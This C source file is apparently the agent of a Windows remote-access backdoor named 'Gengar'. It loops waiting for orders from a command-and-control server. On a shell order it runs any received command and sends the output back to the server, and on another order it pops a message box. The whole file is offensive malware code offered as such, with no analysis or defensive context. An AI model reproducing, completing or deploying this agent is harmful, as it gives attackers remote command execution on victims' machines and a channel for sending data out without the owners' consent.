#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "client.h"
#include "shell.h"

#define CMDTYPE_BUFSIZE 1
#define MSGBOX_BUFSIZE 128
#define SHELL_BUFSIZE 4096

enum cmdtypes { shell, msgbox };

void handle_shell() {
  char *cmd, *out;
  cmd = recvfromcnc(SHELL_BUFSIZE);
  printf("Executing shell command: %s\n", cmd);
  out = run(cmd);
  free(cmd);
  sendtocnc(out);
  free(out);
}

void handle_msgbox() {
  char *msg;
  msg = recvfromcnc(MSGBOX_BUFSIZE);
  printf("Popping MessageBox: %s", msg);
  MessageBox(NULL, msg, "Gengar Says", 0);
  free(msg);
}

void startagent() {
  char *res;

  while (1) {
    res = recvfromcnc(CMDTYPE_BUFSIZE);
    enum cmdtypes cmdtype = (int)res[0];
    free(res);

    switch (cmdtype) {
      case shell:
        handle_shell();
        break;
      case msgbox:
        handle_msgbox();
        break;
    }
  }
}
